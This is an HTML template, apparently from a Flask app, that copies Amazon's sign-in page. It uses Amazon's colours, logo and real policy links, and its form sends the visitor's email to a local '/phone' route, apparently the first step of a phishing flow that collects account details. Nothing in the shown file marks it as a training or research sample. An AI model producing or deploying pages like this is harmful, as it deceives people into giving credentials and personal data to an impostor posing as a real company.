<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f3f3f3;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group input {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
        }
        .btn {
            width: 100%;
            padding: 10px;
            background-color: #ff9900;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        .terms {
            margin-top: 10px;
            font-size: 12px;
            color: #555;
        }
        .terms a {
            color: #0066c0;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="{{ url_for('static', filename='amazon_logo.png') }}" alt="Amazon Logo" class="logo">
        <h2>Sign In</h2>
        <form action="/phone" method="post">
            <div class="form-group">
                <input type="email" name="email" placeholder="Email" required>
            </div>
            <button type="submit" class="btn">Continue</button>
        </form>
        <div class="terms">
            By continuing, you agree to Amazon's <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508088" target="_blank">Conditions of Use</a> and <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508500" target="_blank">Privacy Notice</a>.
        </div>
    </div>
</body>
</html>
